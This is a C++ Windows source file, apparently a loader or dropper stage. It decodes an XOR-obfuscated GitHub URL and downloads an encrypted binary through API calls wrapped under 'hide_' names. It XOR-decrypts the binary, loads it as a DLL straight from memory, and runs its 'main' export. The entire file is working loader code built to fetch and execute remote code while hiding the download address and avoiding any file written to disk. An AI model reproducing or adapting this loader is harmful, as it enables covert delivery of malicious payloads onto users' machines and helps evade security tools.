#include <iostream>
#include <vector>

#include <windows.h>

#ifdef _DEBUG
#include <fstream>
#endif // _DEBUG

#include "mem/memod.h"
#include "utils.h"

typedef int (CALLBACK * DLL_FUNCTION)();

#define ADR_XOR_KEY 'A'
#define ADR_XOR_URL { 0x29, 0x35, 0x35, 0x31, 0x32, 0x7b, 0x6e, 0x6e, 0x26, 0x28, 0x35, 0x29, 0x34, 0x23, 0x6f, 0x22, 0x2e, 0x2c, 0x6e, 0x2b, 0x34, 0x2d, 0x24, 0x32, 0x26, 0x33, 0x22, 0x71, 0x6e, 0x00, 0x05, 0x13, 0x6e, 0x33, 0x20, 0x36, 0x6e, 0x2c, 0x20, 0x28, 0x2f, 0x6e, 0x00, 0x05, 0x13, 0x6f, 0x23, 0x28, 0x2f }
// XOR => https://github.com/julesgrc0/ADR/raw/main/ADR.bin

std::vector<char> GetPayload(const std::string& url)
{
	std::vector<char> payload;

	HINTERNET hInternet = hide_InternetOpenA("ADR", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
	if (hInternet == NULL) 
	{
		return payload;
	}

	HINTERNET hConnect = hide_InternetOpenUrlA(hInternet, url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
	if (hConnect == NULL) 
	{
		hide_InternetCloseHandle(hInternet);
		return payload;
	}


	constexpr size_t bufferSize = 8192;
	std::vector<char> buffer(bufferSize);
	DWORD bytesRead = 0;

	while (hide_InternetReadFile(hConnect, buffer.data(), static_cast<DWORD>(buffer.size()), &bytesRead) && bytesRead > 0)
	{
		payload.insert(payload.end(), buffer.begin(), buffer.begin() + bytesRead);
	}

	hide_InternetCloseHandle(hConnect);
	hide_InternetCloseHandle(hInternet);

	return payload;
}


int WINAPI WinMain(_In_ HINSTANCE hInstance, _In_opt_  HINSTANCE hPrevInstance, _In_ char* pCmdLine, _In_ int nCmdShow)
{
#ifdef _DEBUG

	if (AllocConsole())
	{
		FILE* fDummy;

		freopen_s(&fDummy, "CONOUT$", "w", stdout);
		freopen_s(&fDummy, "CONOUT$", "w", stderr);
		freopen_s(&fDummy, "CONIN$", "r", stdin);

		std::cout.clear();
		std::clog.clear();
		std::cerr.clear();
		std::cin.clear();
	}

	std::ifstream ifs("D:\\dev\\repos\\project\\software\\ADR\\x64\\Release\\ADR.bin", std::fstream::binary | std::fstream::out);
	std::vector<char> data((std::istreambuf_iterator<char>(ifs)),(std::istreambuf_iterator<char>()));
#else
	std::vector<char> url = DecodeXor(ADR_XOR_URL, ADR_XOR_KEY);
	std::vector<char> data = GetPayload(std::string(url.begin(), url.end()));
#endif // _DEBUG_EXE

	data = DecodeXor(data, ADR_XOR_KEY);
	HMEMORYMODULE handle = MemoryLoadLibrary(data.data(), data.size());
	if (!handle) return 1;

	DLL_FUNCTION main = (DLL_FUNCTION)MemoryGetProcAddress(handle, "main");
	if (!main) return 1;

	main();

	MemoryFreeLibrary(handle);
	return 0;
}